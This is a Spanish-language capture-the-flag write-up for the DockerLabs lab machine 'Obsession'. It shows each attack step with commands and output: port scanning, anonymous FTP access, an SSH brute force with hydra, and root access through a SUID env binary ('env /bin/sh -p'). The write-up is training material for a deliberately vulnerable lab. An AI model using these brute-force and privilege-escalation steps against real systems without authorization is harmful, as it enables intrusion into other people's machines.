---
title: Obsession - DockerLabs
categories: [ Linux ]
tags: [DockerLabs]
---

<img src="/assets/img/DLabs/obsession/obsession.png" alt="Captura de pantalla de la máquina Obsession en DockerLabs">

Hoy explotaremos la máquina *Obsession* de [DockerLabs](https://dockerlabs.es/), de dificultad Muy Fácil. Vamos a obtener datos vía FTP y realizar un ataque de fuerza bruta con *hydra*.

## Desplegamos la máquina

```bash
➤ sudo bash auto_deploy.sh obsession.tar 
[sudo] contraseña para nmc:     

	                    ##        .         
	              ## ## ##       ==         
	           ## ## ## ##      ===         
	       /""""""""""""""""\___/ ===       
	  ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	       \______ o          __/           
	         \    \        __/            
	          \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```



## Escaneo NMAP

Antes que nada, realizaremos un escaneo de puertos con **nmap** para encontrar los puertos abiertos y qué servicios están corriendo en ellos.

```bash
➤ nmap -sV -p- --min-rate=100 -T4 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-19 16:34 CST
Nmap scan report for 172.17.0.2
Host is up (0.00011s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds
```



Nos percatamos de que tenemos tres puertos abiertos: <mark>21 (FTP)</mark>, <mark>22 (SSH)</mark> y <mark>80 (HTTP con Apache)</mark>.

## Conexión FTP

Nos conectamos por FTP y nos logueamos con el usuario *anónimo*.

```bash
➤ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:nmc): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||26272|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
226 Directory send OK.
ftp>
```



Descargamos los dos archivos `.txt` usando `get`.

```bash
ftp> get chat-gonza.txt
local: chat-gonza.txt remote: chat-gonza.txt
229 Entering Extended Passive Mode (|||8226|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |***********************************|   667        4.51 MiB/s    00:00 ETA
226 Transfer complete.
667 bytes received in 00:00 (579.50 KiB/s)
ftp> get pendientes.txt
local: pendientes.txt remote: pendientes.txt
229 Entering Extended Passive Mode (|||40743|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |***********************************|   315        2.91 MiB/s    00:00 ETA
226 Transfer complete.
315 bytes received in 00:00 (368.84 KiB/s)
```



Revisamos los archivos con `cat`.

```bash
➤ cat chat-gonza.txt 
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy

➤ cat pendientes.txt 
1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!

2 Aumentar el precio de mis asesorías online en la Web!

3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!

4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros..
```



Como vemos en el primer archivo, aparecen dos posibles usuarios. Así que utilizaremos *hydra* mientras observamos la web por si hay alguna pista.

<img src="/assets/img/DLabs/obsession/obsession-web.png" alt="Captura de pantalla de la pagina web de Obsession">

## Hydra

Como observamos tanto en la web como en el chat, parece que el usuario principal es **russoski**, así que buscaremos su contraseña con *hydra*.

```bash
➤ hydra -l russoski  -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
[STATUS] 14344398.00 tries/min, 14344398 tries in 00:01h, 2 to do in 00:01h, 12 active
```



Se encontró la contraseña: **iloveme**

## Infiltración 

Nos logueamos y aprovechamos los permisos incorrectos, como se menciona en el segundo archivo.

```bash
➤ ssh russoski@172.17.0.2
russoski@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri Jun 20 00:28:48 2025 from 172.17.0.1
russoski@38a21dd80d6e:~$ sudo -l
Matching Defaults entries for russoski on 38a21dd80d6e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User russoski may run the following commands on 38a21dd80d6e:
    (root) NOPASSWD: /usr/bin/vim
```



El usuario *russoski* tiene permiso para ejecutar **/usr/bin/vim** como root sin contraseña.

## Escalada de privilegios

Buscamos archivos con el bit **SUID** activado:

```bash
russoski@38a21dd80d6e:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/env
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
russoski@38a21dd80d6e:~$
```



El binario <mark>/usr/bin/env</mark> tiene el bit **SUID** activado, lo que permite ejecutarlo con privilegios de root. Lo aprovechamos para escalar privilegios con el siguiente comando y verificamos con `whoami`:

```bash
russoski@38a21dd80d6e:~$ /usr/bin/env /bin/sh -p
# whoami
root
#
```



## Acceso ROOT obtenido

¡Máquina comprometida! Te deseo un feliz hackeo.
